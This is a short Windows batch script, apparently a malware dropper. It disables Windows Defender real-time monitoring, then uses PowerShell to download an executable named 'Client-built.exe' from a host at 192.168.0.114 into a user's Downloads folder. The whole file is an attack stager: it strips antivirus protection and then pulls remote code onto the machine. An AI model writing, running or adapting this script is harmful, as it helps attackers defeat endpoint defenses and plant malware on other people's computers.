@echo off
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
setlocal

rem Set the URL of the file you want to download
set "url=https://192.168.0.114/Client-built.exe"

rem Set the destination path where you want to save the downloaded file
set "destination=C:\Users\mca1\Downloads"

rem Use PowerShell to download the file
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%destination%')"
